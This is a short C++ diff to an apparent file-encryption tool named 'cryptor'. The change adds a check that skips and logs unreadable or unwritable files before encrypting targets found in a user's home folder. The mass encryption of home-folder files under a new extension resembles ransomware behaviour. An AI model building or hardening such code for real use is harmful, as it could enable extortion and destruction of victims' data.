@@ -144,6 +144,17 @@ std::vector<fs::path> cryptor::Main::encrypt(const fs::path& homeFolder, const s
 	auto encryptor = [&cryptorEngine, &successfullyEncrypted, &failedEncrypted](const std::vector<fs::path>& targets){
 		//Loop over the targets
 		for(fs::path target : targets){
+			//Before doing anything, check if the file is readable and writable
+			if(!common::utils::FS::canRead(target) || !common::utils::FS::canWrite(target)){
+				//Get the reason for failure
+				std::string reason = common::utils::FS::canRead(target) ? "unwritable" : "unreadable";
+
+				//Add target to the failed list and skip the loop
+				failedEncrypted.push_back(target);
+				std::cout << "Skipped file at path '" << target.string() << "'. Reason: " << reason << std::endl;
+				continue;
+			}
+
 			//Create the path in which the target encrypted file will be dropped
 			fs::path encryptedOut = common::utils::FS::appendExt(target, common::Settings::ENCRYPTED_EXTENSION);
 
